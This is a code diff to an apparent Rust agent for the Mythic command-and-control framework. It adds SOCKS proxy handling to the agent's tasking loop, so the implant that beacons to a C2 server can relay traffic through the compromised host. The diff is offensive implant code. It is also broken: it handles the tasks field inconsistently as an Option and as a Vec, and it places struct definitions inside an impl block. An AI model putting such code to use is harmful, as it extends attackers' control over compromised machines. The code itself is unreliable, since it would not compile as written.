@@ -128,43 +128,63 @@ impl Agent {
     }
 
     /// Gets new tasking from Mythic
-    pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
-        // Create the body for receiving new tasking
-        let json_body = json!({
-            "action": "get_tasking",
-            "tasking_size": -1,
-        })
-        .to_string();
+// In agent.rs - modify get_tasking method
+pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
+    let json_body = json!({
+        "action": "get_tasking",
+        "tasking_size": -1,
+    })
+    .to_string();
 
-        // Send the data through the C2 profile to Mythic
-        let body = self.c2profile.send_data(&json_body)?;
+    let body = self.c2profile.send_data(&json_body)?;
+    let response: GetTaskingResponse = serde_json::from_str(&body)?;
 
-        // Deserialize the response into a struct
-        let response: GetTaskingResponse = serde_json::from_str(&body)?;
-
-        // Return a success and any tasking
-        if !response.tasks.is_empty() {
-            Ok(Some(response.tasks))
-        } else {
-            Ok(None)
+    // Check for SOCKS data in response
+    if let Some(socks_data) = response.socks {
+        // Process SOCKS data immediately
+        let socks_task = AgentTask {
+            command: "socks_data".to_string(),
+            parameters: serde_json::to_string(&socks_data)?,
+            timestamp: 0.0,
+            id: "socks_immediate".to_string(),
+        };
+        let mut immediate_tasks = vec![socks_task];
+        
+        // Add regular tasks if any
+        if let Some(mut tasks) = response.tasks {
+            immediate_tasks.append(&mut tasks);
+            return Ok(Some(immediate_tasks));
         }
+        return Ok(Some(immediate_tasks));
     }
 
+    if !response.tasks.is_empty() {
+        Ok(Some(response.tasks))
+    } else {
+        Ok(None)
+    }
+}
+
+// Modify the GetTaskingResponse struct to include SOCKS data
+    #[derive(Debug, Deserialize, Serialize)]
+    pub struct GetTaskingResponse {
+        pub tasks: Vec<AgentTask>,
+        #[serde(default)]
+        pub socks: Option<Vec<SocksMsg>>, // Add this field
+    }
     /// Sends completed tasking to Mythic
     /// * `completed` - Slice of completed tasks
     pub fn send_tasking(
         &mut self,
         completed: &[serde_json::Value],
     ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
-        // Create the request body with the completed tasking information
         let body = PostTaskingResponse {
             action: "post_response".to_string(),
             responses: completed.to_owned(),
+            socks: Vec::new(), // You can populate this with SOCKS responses
         };
-
+    
         let req_payload = serde_json::to_string(&body)?;
-
-        // Send the completed task data
         let json_response = self.c2profile.send_data(&req_payload)?;
 
         // Deserialize the response into a struct
@@ -192,7 +212,14 @@ impl Agent {
             Ok(None)
         }
     }
-
+    // Update PostTaskingResponse to include SOCKS
+    #[derive(Debug, Deserialize, Serialize)]
+    pub struct PostTaskingResponse {
+        pub action: String,
+        pub responses: Vec<serde_json::Value>,
+        #[serde(skip_serializing_if = "Vec::is_empty")]
+        pub socks: Vec<SocksMsg>,
+    }
     /// Sleep the agent for the specified interval and jitter or sleep the agent
     /// if not in the working hours time frame
     pub fn sleep(&mut self) {
